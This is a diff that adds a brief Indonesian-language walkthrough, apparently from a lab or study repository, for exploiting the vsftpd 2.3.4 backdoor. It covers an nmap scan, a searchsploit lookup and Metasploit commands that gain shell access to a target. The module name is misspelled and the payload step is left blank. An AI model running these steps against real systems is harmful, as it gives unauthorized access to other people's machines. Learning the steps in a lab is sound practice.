@@ -1,0 +1,27 @@
+# exploit vsftpd 2.3.4,,vsftpd ini berjalan di port 21
+
+# enmueration port dengan nmap
+$ nmap -sV <ip target>
+
+# cari di serchspploit
+$ searchsploit vsftpd 2.3.4 
+## output
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)   
+
+# buka metasploit
+$ msfconsole
+# di metasploit cari vsftpd
+msf6 > search vsftpd
+### output
+0 exploit/unix/ftp/vvsftpd_2.3.4_backdoor
+# gunakan exploit nya dengan perintah use <nama exploit atau nomer nya>
+msf6 > use 0
+# untuk melihat informasinya ketik show info
+# set rhostnya denga ip target dengan perintah set rhosts <ip target>
+msf6 exploit(exploit/unix/ftp/vvsftpd_2.3.4_backdoor) > set rhosts <ip target>
+# set payload nya dengan perintah set payload atau nama payload nya yaitu cmd/unix/interact
+msf6 exploit(exploit/unix/ftp/vvsftpd_2.3.4_backdoor) > 
+# jalankan exploitnya dengan perintah run atau exploit
+msf6 exploit(exploit/unix/ftp/vvsftpd_2.3.4_backdoor) > run
+
+# dan kita sudah bisa mengakses target nya
